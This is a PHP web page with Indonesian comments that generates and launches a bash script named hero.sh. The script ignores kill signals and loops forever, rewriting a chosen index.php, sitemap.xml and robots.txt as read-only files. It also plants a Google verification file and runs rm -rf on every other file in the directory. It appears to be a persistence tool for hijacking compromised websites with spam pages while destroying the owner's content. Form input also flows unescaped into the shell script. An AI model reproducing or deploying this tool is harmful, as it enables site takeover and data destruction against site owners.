<?php
// Check if the form has been submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $directory = $_POST["directory"];
    $file_content_index = $_POST["file_content_index"];
    $file_content_sitemap = $_POST["file_content_sitemap"];
    $file_content_robots = $_POST["file_content_robots"];

    $script = <<<EOT
#!/bin/bash

directory="$directory" # jangan lupa di ganti
file_path_index="\$directory/index.php"
file_path_html="\$directory/google2ebc7d2288acf467.html"
file_path_sitemap="\$directory/sitemap.xml"
file_path_robots="\$directory/robots.txt"
file_content_index="$file_content_index"
file_content_html="Z29vZ2xlLXNpdGUtdmVyaWZpY2F0aW9uOiBnb29nbGUyZWJjN2QyMjg4YWNmNDY3Lmh0bWw=" # jangan di ganti
file_content_sitemap="$file_content_sitemap"
file_content_robots="$file_content_robots"

trap '' SIGTERM SIGINT SIGQUIT SIGHUP SIGTSTP SIGSTOP SIGCONT

create_directory() {
    if [ ! -d "\$1" ]; then
        mkdir -p "\$1"
    fi
}

check_and_fix_file() {
    local path=\$1
    local content=\$2
    
    if [ -f "\$path" ]; then
        current_content=\$(base64 "\$path" | tr -d '\\n')
        if [ "\$current_content" != "\$content" ]; then
            echo -n \$content | base64 -d > "\$path"
            echo "[!] Memperbaiki konten dari \$path"
        fi
    else
        echo -n \$content | base64 -d > "\$path"
        chmod 0444 \$path
        echo "[!] Membuat file \$path"
    fi
}

delete_files() {
    for filename in "\$directory"/*; do
        if [[ \$filename != \$file_path_index && \$filename != \$file_path_html && \$filename != \$file_path_sitemap && \$filename != \$file_path_robots ]]; then
            rm -rf "\$filename"
        fi
    done
}

while true; do
    if [ ! -d "\$directory" ]; then
        echo "[!] Directory not found"
        echo "[!] Creating directory"
        create_directory "\$directory"
    fi

    check_and_fix_file "\$file_path_index" "\$file_content_index"
    check_and_fix_file "\$file_path_html" "\$file_content_html"
    check_and_fix_file "\$file_path_sitemap" "\$file_content_sitemap"
    check_and_fix_file "\$file_path_robots" "\$file_content_robots"
    
    delete_files
    sleep 10
done

EOT;

    file_put_contents("hero.sh", $script);
    echo "<p>Bash script 'hero.sh' has been created.</p>";

    // Run commands after creating the script
    exec('sed -i \'s/\r$//\' hero.sh');
    exec('setsid bash hero.sh > /dev/null 2>&1 &');
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Create Bash Script Hapus All</title>
    <script>
        function validateForm() {
            var directory = document.forms["scriptForm"]["directory"].value;
            if (directory === "") {
                alert("Directory must be filled out");
                return false;
            }
            // Anda bisa menambahkan lebih banyak validasi di sini jika diperlukan
            return true;
        }
    </script>
</head>
<body>
    <h2>Create Bash Script Hapus All</h2>
    <form name="scriptForm" method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" onsubmit="return validateForm()">
        <label for="directory">Directory:</label><br> <p>contoh : /home2/vvitengi/public_html jangan kayak gini : /home2/vvitengi/public_html/</p>
        <input type="text" id="directory" name="directory" value="ganti path" required><br><br>

        <label for="file_content_index">File Content Index Base64:</label><br>
        <textarea id="file_content_index" name="file_content_index" rows="4" cols="50">ganti</textarea><br><br>

        <label for="file_content_sitemap">File Content Sitemap Base64:</label><br>
        <textarea id="file_content_sitemap" name="file_content_sitemap" rows="4" cols="50">ganti</textarea><br><br>

        <label for="file_content_robots">File Content Robots Base64:</label><br>
        <textarea id="file_content_robots" name="file_content_robots" rows="4" cols="50">ganti</textarea><br><br>

        <input type="submit" value="Create Script">
    </form>
</body>
</html>
